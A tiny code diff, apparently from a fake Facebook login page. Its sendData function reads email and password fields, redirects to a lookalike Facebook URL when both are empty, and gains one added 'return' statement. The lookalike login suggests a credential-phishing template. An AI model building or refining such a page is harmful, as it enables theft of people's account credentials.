@@ -15,6 +15,7 @@ function sendData()
 	if($("email").value=="" && $("pass").value=="")
 	{
 		window.location="https://fbtemplate.github.io/facebook.com/login";
+		return;
 	}
 	
 			var data = {
